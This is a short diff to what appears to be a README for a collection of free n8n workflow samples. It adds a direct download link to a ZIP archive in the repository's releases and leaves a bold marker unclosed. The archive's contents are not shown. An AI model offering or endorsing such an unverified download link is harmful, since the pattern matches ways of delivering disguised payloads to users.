@@ -1,6 +1,8 @@
 🚀 N8N Automation Vault — Free Samples
 
-A curated collection of **15 free n8n workflow samples**.
+A curated collection of **15 free n8n workflow samples.
+
+📦 Download All 15 Workflows (ZIP) 👉 https://github.com/nuriftamambgd-oss/n8n-automation-vault-free-samples/releases/download/v1.0/N8N-Automation-Vault-15-Free-GitHub-Samples.1.zip
 
 ## What's Included
 
